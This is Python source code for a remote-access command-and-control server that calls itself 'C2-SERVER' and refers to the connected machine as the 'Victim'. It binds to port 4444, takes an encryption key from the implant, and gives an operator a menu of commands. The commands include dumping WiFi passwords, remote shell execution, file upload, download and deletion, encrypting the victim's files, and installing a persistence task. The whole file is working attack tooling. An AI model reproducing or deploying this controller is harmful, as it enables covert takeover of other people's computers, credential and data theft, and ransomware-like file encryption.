import socket
import os
import time
from Crypto.Cipher import AES

class EncryptedServer:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.key = None
        self.nonce = None
        self.operating_system = None
        self.conn = None

    def Start_server(self):
        self.sock.bind(("0.0.0.0", 4444))
        self.sock.listen(1)
        print("[*] Listening for Connections ...")
        self.conn, addr = self.sock.accept()
        print(f"[*] Connection from {addr}")
        self.key = self.conn.recv(32)  # Receive 256-bit key
        self.nonce = self.conn.recv(12)  # Receive 96-bit nonce
        self.operating_system = self.conn.recv(1024).decode()
        print(f"Victim's OS => {self.operating_system}")

    def encrypt(self, data: bytes) -> bytes:
        cipher = AES.new(self.key, AES.MODE_CTR, nonce=self.nonce)
        return cipher.encrypt(data)

    def decrypt(self, data: bytes) -> bytes:
        cipher = AES.new(self.key, AES.MODE_CTR, nonce=self.nonce)
        return cipher.decrypt(data)

    def download(self,filename):
        file_size = int(self.decrypt(self.conn.recv(1024)).decode())
        print(f"File size: {file_size} bytes")
        block_size = 1024
        num_blocks = file_size // block_size
        remaining_bytes = file_size % block_size
        if remaining_bytes != 0:
            print(f"chunks: {num_blocks + 1}")
        else:
            print(f"chunks: {num_blocks}")

        with open(f'{filename}','wb') as file:
            # full_data = b''
            chunk_number = 1
            for i in range(num_blocks):    
                data = self.conn.recv(1024)
                # full_data += data
                file.write(data)
                progress = (chunk_number / num_blocks) * 100
                bar_width = 50
                filled = int(bar_width * chunk_number // num_blocks)
                bar = '=' * filled + '-' * (bar_width - filled)
                print(f'Progress: [{bar}] {progress:.1f}%', end='\r', flush=True)
                chunk_number += 1
            data = self.conn.recv(remaining_bytes)
            # full_data += data
            print("\nLast Chunk received")
            # file.write(full_data)
            file.write(data)
            file.close()
            print("File received successfully.")

    def upload(self,filename):
        current_path =  os.path.abspath(os.getcwd())
        file_path = os.path.join(current_path,filename)
        file_size_upload = str(os.path.getsize(file_path))
        self.conn.sendall(self.encrypt(file_size_upload.encode()))
        print(f"File size: {file_size_upload} bytes")
        time.sleep(0.2)
        block_size = 1024
        num_blocks = int(file_size_upload) // block_size
        remaining_bytes = int(file_size_upload) % block_size
        if remaining_bytes != 0:
            print(f"chunks: {num_blocks + 1}")
        else:
            print(f"chunks: {num_blocks}")

        with open(filename, 'rb') as file:
            chunk_number = 1
            for i in range(num_blocks):
                data_chunk = file.read(1024)
                self.conn.sendall(data_chunk)
                progress = (chunk_number / num_blocks) * 100
                bar_width = 50
                filled = int(bar_width * chunk_number // num_blocks)
                bar = '=' * filled + '-' * (bar_width - filled)
                print(f'Progress: [{bar}] {progress:.1f}%', end='\r', flush=True)
                chunk_number += 1
                time.sleep(0.05)
            data_chunk = file.read(remaining_bytes)
            self.conn.sendall(data_chunk)
            print("\nLast chunk sent")
            file.close()
            print("File sent successfully.")

    def to_chunks(self, data: bytes, chunk_size: int = 1024):
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

    def authenticate(self):
        for times in range(3):
            print(self.decrypt(self.conn.recv(1024)).decode(), end="")
            self.conn.send(self.encrypt(input().encode()))
            print(self.decrypt(self.conn.recv(1024)).decode(), end="")
            self.conn.send(self.encrypt(input().encode()))

            result = self.decrypt(self.conn.recv(1024)).decode()
            print(result)
            if "successful" in result:
                return True
        self.conn.close()
        return False

    def send_command(self, command: str):
        self.conn.sendall(self.encrypt(command.encode()))

    def receive_data(self):
        num_chunks = int(self.decrypt(self.conn.recv(1024)).decode())
        encrypted_data = b''
        for chunk in range(num_chunks):
            encrypted_data += self.conn.recv(1024)
            self.conn.sendall(self.encrypt(f"Chunk {chunk} received".encode()))
        try:
            print(self.decrypt(encrypted_data).decode())
        except Exception as e:
            print(f"Error decrypting data: {e}")


    def handle_response(self, command: str):
        if "del" in command:
            print(self.decrypt(self.conn.recv(1024)).decode())


        elif "upload" in command:
            file_name = command[7:]
            self.send_command(file_name)
            time.sleep(0.1)
            self.upload(file_name)

        elif "download" in command:
            file_name = command[9:]
            self.send_command(file_name)
            time.sleep(0.1)
            self.download(file_name)
        
        elif "encrypt" in command:
            file_name = command[8:]
            self.send_command(file_name)
            time.sleep(0.1)
            response = self.decrypt(self.conn.recv(1024)).decode()
            print(response)
        
        elif "decrypt" in command:
            file_name = command[8:]
            self.send_command(file_name)
            time.sleep(0.1)
            response = self.decrypt(self.conn.recv(1024)).decode()
            print(response)


        else:
            self.receive_data()


    def run(self):
        try:
            if not self.authenticate():
                return

            print("""\nAvailable commands:
                    dir                     List directory contents
                    path                    Show current working directory
                    ipconfig                Show network configuration
                    arp -a                  Display ARP table
                    hostname                Show system hostname and details
                    ps                      List running processes
                    kill <PID/name>         Kill a process by PID or name
                    system                  Show system resource usage (CPU & Memory)
                    wifi-networks           List available WiFi networks
                    wifi-password <network> Get password for a WiFi network
                    cd <dir>                Change directory
                    del <file>              Delete a file
                    download <file>         Download file from client
                    upload <file>           Upload file to client
                    encrypt <file>          Encrypt a file
                    decrypt <file>          Decrypt a file
                    shell <command>         Execute a command
                    install-task            Install task
                    uninstall-task          Uninstall task
                    help                    Show this help message
                    close / exit            Terminate session
                """)

            while True:
                command = input("shell> ").strip()
                if command == "help":
                    print("""Available commands:
                            dir                     List directory contents
                            path                    Show current working directory
                            ipconfig                Show network configuration
                            arp -a                  Display ARP table
                            hostname                Show system hostname and details
                            ps                      List running processes
                            kill <PID/name>         Kill a process by PID or name
                            system                  Show system resource usage (CPU & Memory)
                            wifi-networks           List available WiFi networks
                            wifi-password <network> Get password for a WiFi network
                            cd <dir>                Change directory
                            del <file>              Delete a file
                            download <file>         Download file from client
                            upload <file>           Upload file to client
                            encrypt <file>          Encrypt a file
                            decrypt <file>          Decrypt a file
                            shell <command>         Execute a command
                            install-task            Install task
                            uninstall-task          Uninstall task
                            help                    Show this help message
                            close / exit            Terminate session
                        """)
                    continue

                elif (command.lower() == "exit") or (command.lower() == "close"):
                    print("\n[!] Interrupted by user. Closing connection.")
                    self.send_command("close")
                    self.conn.close()
                    break

                self.send_command(command)
                self.handle_response(command)

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user. Closing connection.")
            self.send_command("close")
        finally:
            self.conn.close()


if __name__ == "__main__":
    print("""
 ██████╗██████╗       ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝╚════██╗      ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██║      █████╔╝█████╗███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║     ██╔═══╝ ╚════╝╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
╚██████╗███████╗      ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
 ╚═════╝╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
""")
    server = EncryptedServer()
    server.Start_server()
    server.run()
